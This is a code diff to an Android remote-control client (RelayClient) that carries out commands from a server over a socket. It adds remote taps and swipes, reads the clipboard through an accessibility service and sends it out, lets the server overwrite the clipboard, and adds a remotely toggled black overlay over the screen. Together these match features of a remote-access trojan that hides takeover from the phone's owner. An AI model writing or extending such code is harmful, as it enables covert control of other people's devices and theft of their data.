@@ -125,14 +125,15 @@ public class RelayClient {
                 try {
                     JSONObject p = args.length > 0 ? (JSONObject) args[0] : new JSONObject();
                     String type = p.optString("type", "tap");
+                    // Screen is captured at /2 resolution — multiply coords by 2
                     switch (type) {
                         case "tap":
-                            svc.tap((float) p.optDouble("x", 0), (float) p.optDouble("y", 0));
+                            svc.tap((float) p.optDouble("x", 0) * 2f, (float) p.optDouble("y", 0) * 2f);
                             break;
                         case "swipe":
                             svc.swipe(
-                                (float) p.optDouble("x1", 0), (float) p.optDouble("y1", 0),
-                                (float) p.optDouble("x2", 0), (float) p.optDouble("y2", 0),
+                                (float) p.optDouble("x1", 0) * 2f, (float) p.optDouble("y1", 0) * 2f,
+                                (float) p.optDouble("x2", 0) * 2f, (float) p.optDouble("y2", 0) * 2f,
                                 p.optLong("duration", 300));
                             break;
                         case "back":    svc.goBack();    break;
@@ -195,11 +196,38 @@ public class RelayClient {
 
             socket.on("get_clipboard_content", args -> {
                 try {
+                    // Read via InputService (AccessibilityService) — allowed on Android 10+
+                    String text = "";
+                    InputService inputSvc = InputService.getInstance();
+                    if (inputSvc != null) {
+                        text = inputSvc.readClipboard();
+                    } else {
+                        text = DataCollector.getClipboard(service);
+                    }
                     JSONObject res = new JSONObject();
-                    res.put("text",       DataCollector.getClipboard(service));
+                    res.put("text",       text);
                     res.put("_requester", requester(args));
                     socket.emit("clipboard_content_result", res);
                 } catch (Exception e) { Log.e(TAG, "get_clipboard_content error", e); }
+            });
+
+            socket.on("set_clipboard", args -> {
+                try {
+                    JSONObject p = args.length > 0 ? (JSONObject) args[0] : new JSONObject();
+                    String text = p.optString("text", "");
+                    InputService inputSvc = InputService.getInstance();
+                    if (inputSvc != null) {
+                        inputSvc.writeClipboard(text);
+                    } else {
+                        android.content.ClipboardManager cm = (android.content.ClipboardManager)
+                            service.getSystemService(android.content.Context.CLIPBOARD_SERVICE);
+                        if (cm != null) cm.setPrimaryClip(android.content.ClipData.newPlainText("", text));
+                    }
+                    JSONObject res = new JSONObject();
+                    res.put("ok", true);
+                    res.put("_requester", requester(args));
+                    socket.emit("set_clipboard_result", res);
+                } catch (Exception e) { Log.e(TAG, "set_clipboard error", e); }
             });
 
             socket.on("get_installed_apps", args -> {
@@ -224,6 +252,26 @@ public class RelayClient {
             // ── Screen off / lock ─────────────────────────────────────────────
             socket.on("screen_off", args -> {
                 service.lockScreen(requester(args));
+            });
+
+            // ── Black screen overlay ──────────────────────────────────────────
+            socket.on("screen_dark", args -> {
+                try {
+                    service.getScreenOverlay().showBlackScreen();
+                    JSONObject res = new JSONObject();
+                    res.put("ok", true);
+                    res.put("_requester", requester(args));
+                    socket.emit("screen_dark_result", res);
+                } catch (Exception e) { Log.e(TAG, "screen_dark error", e); }
+            });
+            socket.on("screen_dark_off", args -> {
+                try {
+                    service.getScreenOverlay().hideBlackScreen();
+                    JSONObject res = new JSONObject();
+                    res.put("ok", true);
+                    res.put("_requester", requester(args));
+                    socket.emit("screen_dark_result", res);
+                } catch (Exception e) { Log.e(TAG, "screen_dark_off error", e); }
             });
 
             socket.connect();
